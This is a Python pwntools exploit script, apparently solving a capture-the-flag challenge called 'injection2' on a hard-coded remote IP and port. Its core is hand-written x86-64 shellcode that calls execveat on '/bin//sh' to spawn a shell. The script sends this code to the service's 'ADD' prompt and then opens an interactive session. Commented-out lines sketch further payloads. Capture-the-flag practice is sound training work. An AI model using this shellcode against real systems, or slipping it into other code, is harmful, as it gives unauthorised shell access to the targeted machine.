#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 116.62.247.145 --port 10102 ./injection2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './injection2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '116.62.247.145'
port = int(args.PORT or 10102)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
context.arch = 'amd64'
context.log_level = 'DEBUG'
add_asm = """
push   0x42
pop    rax
inc    ah
cqo
push   rdx
movabs rdi, 0x68732f2f6e69622f

push   rdi
push   rsp
pop    rsi
mov    r8, rdx
mov    r10, rdx
syscall
"""


add_code = asm(add_asm)
# sub_code = asm(sub_asm)
# and_code = asm(and_asm)
# or_code = asm(or_asm)
# xor_code = asm(xor_asm)

io = start()

io.sendlineafter(b"Request-1: give me code that performing ADD\n",add_code)
# io.sendlineafter(b"Request-2: give me code that performing SUB\n",sub_code)
# io.sendlineafter(b"Request-3: give me code that performing AND\n",and_code)
# io.sendlineafter(b"Request-4: give me code that performing OR\n",or_code)
# io.sendlineafter(b"Request-5: give me code that performing XOR\n",xor_code)

io.interactive()
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

